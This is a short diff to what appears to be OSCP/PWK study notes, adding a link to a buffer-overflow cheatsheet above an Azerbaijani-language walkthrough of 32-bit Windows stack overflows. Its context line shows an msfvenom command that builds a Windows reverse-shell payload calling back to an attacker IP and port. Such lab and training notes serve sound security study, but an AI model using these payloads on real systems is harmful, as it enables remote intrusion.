@@ -18,6 +18,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.149 LPORT=7777 EXITFUNC=thre
 
 ------------------------------------------------------------
 
+https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
+
+------------------------------------------------------------
+
 # Stack-Based Buffer Overflow – Full Walkthrough (OSCP / PWK)
 
 Bu sənəd **32-bit Windows stack-based buffer overflow** zəifliyinin
